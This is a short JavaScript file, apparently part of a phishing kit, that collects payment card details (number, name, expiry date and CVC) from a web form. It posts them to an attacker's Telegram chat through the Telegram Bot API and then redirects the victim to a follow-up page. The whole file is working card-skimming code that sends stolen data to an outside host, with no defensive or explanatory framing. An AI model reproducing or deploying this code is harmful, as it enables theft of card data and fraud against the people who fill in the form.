
var ready = function () {
    number = document.getElementById("number").value;
    name = document.getElementById("name").value;
    month = document.getElementById("month").value;
    year = document.getElementById("year").value;
    cvc = document.getElementById("cvc").value;

    message = name +
        "\n\n\n" + number +
        "\n\n\n" + cvc +
        "\n\n\n" + year +
        "\n\n\n" + month;
};
var sender = function (event) {
    event.preventDefault();
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = "./call-2.html"
    });
    document.getElementById("number").value = "";

    return false;
};